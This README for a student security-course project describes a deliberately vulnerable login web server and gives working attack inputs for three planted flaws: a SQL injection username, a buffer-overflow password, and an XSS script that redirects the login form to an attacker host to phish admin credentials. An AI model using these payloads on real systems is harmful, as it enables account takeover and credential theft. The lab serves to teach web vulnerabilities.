# Computer system security - Project 2  : the 3-flaws webserver
**Group #** : 5

**Members** :
- Laurent MINY
- Etienne DE JAMBLINNE DE MEUX

The whole project was made and tested on a Debian Jessie 8 x64 with Xampp installed and Firefox ESR 45.7.0

## Injection SQL
**User way** - The user enter the 'admin' username and enter his password 'thepassword' to login

**Hacker way** - The injection can be done by entering any password and the following username :
```
admin' or '1'='1' #
```

## Buffer Overflow
**User way** - The user enter the 'admin' username and enter his password 'thepassword' to login

**Hacker way** - The buffer overflow is done by rewriting the variable 'int pwd_matches' with garbage. And everything different over value 0 means "Password valid". So we can enter the username 'admin' (guessed) and the following as password (29 * 'h') :
```
hhhhhhhhhhhhhhhhhhhhhhhhhhhhh
```

**Remarks** :
- the file 'check-login' and 'buff3r-ov3rfl0w' must have the correct rights
- the file 'buff3r-ov3rfl0w' has to be compile for your system (more info in the source file 'buff3r-ov3rfl0w.c'). The one supplied is compiled on Debian Jessie 8 x64.

## XSS

The XSS (Cross-site scripting) is done by entering as username the following javascript (and any password) :

```javascript
<script>
document.addEventListener("DOMContentLoaded", function(event) { // To wait for DOM to be ready
  document.forms["form-login"].action="http://www.attacker-website.com"; // To send to login form to the website of an attacker.
});
</script>
```

If the attacker website is lminy.alwaysdata.net, with a little bit of social engineering, he could send an email to the admin my saying that there is a problem on [this page](http://localhost/homework2/?username=%3Cscript%3Edocument.addEventListener%28%22DOMContentLoaded%22%2Cfunction%28a%29{document.forms[%22form-login%22].action%3D%22http%3A%2F%2Flminy.alwaysdata.net%22}%29%3B%3C%2Fscript%3E&password=pwd). The user is tricked to enter again his login and password and the evil is done!

The attacker can then check its apache logs to know the username & password of the admin :

![Apache-logs](./lminy.alwaysdata.net.log.png?raw=true)
